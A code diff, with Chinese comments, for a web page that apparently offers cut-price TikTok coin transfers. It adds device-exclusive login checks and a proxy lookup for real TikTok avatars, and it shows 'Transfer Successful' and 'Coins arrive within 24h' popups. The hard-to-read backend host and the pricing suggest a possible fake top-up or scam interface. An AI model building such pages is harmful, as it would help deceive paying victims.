@@ -128,8 +128,8 @@ body{background:#ffffff;}
 <div class="popOverlay" id="loadingPop">
   <div class="popBox">
     <div class="spinner"></div>
-    <p>Processing transfer...</p >
-    <p class="countdownTxt" id="countDownText"></p >
+    <p>Processing transfer...</p>
+    <p class="countdownTxt" id="countDownText"></p>
   </div>
 </div>
 
@@ -142,8 +142,8 @@ body{background:#ffffff;}
       </svg>
     </div>
     <h3>Transfer Successful</h3>
-    <p id="popContent"></p >
-    <p style="color:#060;margin-top:10px">Coins arrive within 24h</p >
+    <p id="popContent"></p>
+    <p style="color:#060;margin-top:10px">Coins arrive within 24h</p>
     <button class="popBtn" onclick="closeAllPop()">Done</button>
   </div>
 </div>
@@ -152,7 +152,7 @@ body{background:#ffffff;}
 <script>
 const API_BASE = "https://iiiiiilllllliiiiiiillllllllllllllllliiii.onrender.com";
 
-// 真实头像接口（只改了这里）
+// 真实头像获取函数（替换原来的随机头像）
 async function getRealAvatar(username) {
   try {
     const res = await fetch(`https://tk-proxy-2026.onrender.com/get-avatar?username=${username}`);
@@ -163,29 +163,52 @@ async function getRealAvatar(username) {
   }
 }
 
-// ==============================================
-// 登录验证 + 安全功能（到期、互踢、禁用、记住账号）
-// ==============================================
-window.onload = async () => {
-  const lastUser = localStorage.getItem('last_user');
+// ==============================
+// 核心：操作前校验，旧设备直接死
+// ==============================
+async function checkAuth() {
+  const user = localStorage.getItem('last_user');
   const token = localStorage.getItem('token');
-  if (lastUser) document.getElementById('login_user').value = lastUser;
+  if (!user || !token) return false;
 
-  if (lastUser && token) {
-    try {
-      const res = await fetch('/api/check', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: lastUser, token })
-      });
-      const data = await res.json();
-      if (data.ok) {
-        showApp(true);
-        return;
-      }
-    } catch (e) {}
-    logout();
+  try {
+    const res = await fetch('/api/check', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: user, token })
+    });
+    const data = await res.json();
+    return data.ok;
+  } catch (e) {
+    return false;
   }
+}
+
+// 退出只清token，保留用户名
+function logout() {
+  localStorage.removeItem('token');
+  showApp(false);
+}
+
+// ==============================
+// 自动登录（本机有效，别人打开不会登录）
+// ==============================
+window.onload = async () => {
+  const savedUser = localStorage.getItem('last_user');
+  const token = localStorage.getItem('token');
+
+  if (savedUser) {
+    document.getElementById('login_user').value = savedUser;
+  }
+
+  if (!savedUser || !token) {
+    showApp(false);
+    return;
+  }
+
+  const ok = await checkAuth();
+  if (ok) showApp(true);
+  else logout();
 };
 
 function showApp(visible) {
@@ -193,11 +216,9 @@ function showApp(visible) {
   document.getElementById('app').style.display = visible ? 'block' : 'none';
 }
 
-function logout() {
-  localStorage.removeItem('token');
-  showApp(false);
-}
-
+// ==============================
+// 登录：后登录永远覆盖前面
+// ==============================
 async function doLogin() {
   const userInput = document.getElementById('login_user').value.trim();
   const pwdInput = document.getElementById('login_pwd').value.trim();
@@ -229,27 +250,35 @@ async function doLogin() {
   }
 }
 
-// ==============================================
-// 加载真实用户 + 真实头像（其他完全不动）
-// ==============================================
+// ==============================
+// 所有功能完全原样保留 + 真实头像
+// ==============================
 async function loadTikTokUser() {
+  if (!(await checkAuth())) { logout(); return; }
+
   const user = document.getElementById('usernameInp').value.trim();
   const tipEl = document.getElementById('searchTip');
   const loadingEl = document.getElementById('loading');
 
   if (!user) {
     tipEl.style.display = 'block';
+    document.getElementById('avatar').src = '';
+    document.getElementById('showUser').innerText = '@username';
+    document.getElementById('videos').innerText = '0 videos';
+    document.getElementById('followers').innerText = '0 followers';
+    document.getElementById('following').innerText = '0 following';
     return;
   }
 
   tipEl.style.display = 'none';
   loadingEl.style.display = 'block';
-
-  // 显示真实头像
+  
+  // 加载真实头像
   const realAvatar = await getRealAvatar(user);
   if (realAvatar) {
     document.getElementById('avatar').src = realAvatar;
   }
+  
   document.getElementById('showUser').innerText = '@' + user;
 
   try {
@@ -260,19 +289,12 @@ async function loadTikTokUser() {
       document.getElementById('followers').innerText = data.followers + ' followers';
       document.getElementById('following').innerText = data.following + ' following';
     }
-  } catch (e) {
-    document.getElementById('videos').innerText = '0 videos';
-    document.getElementById('followers').innerText = '0 followers';
-    document.getElementById('following').innerText = '0 following';
-  }
+  } catch (e) {}
 
   loadingEl.style.display = 'none';
   tipEl.style.display = 'block';
 }
 
-// ==============================================
-// 完整充值功能（完整保留）
-// ==============================================
 let selectedCoin = 30;
 let selectedPrice = "$0.31";
 let isCustom = false;
@@ -293,7 +315,9 @@ function switchCustomMode() {
   document.getElementById('customCoins').focus();
 }
 
-function startTransfer() {
+async function startTransfer() {
+  if (!(await checkAuth())) { logout(); return; }
+
   let coin, price;
 
   if (isCustom) {
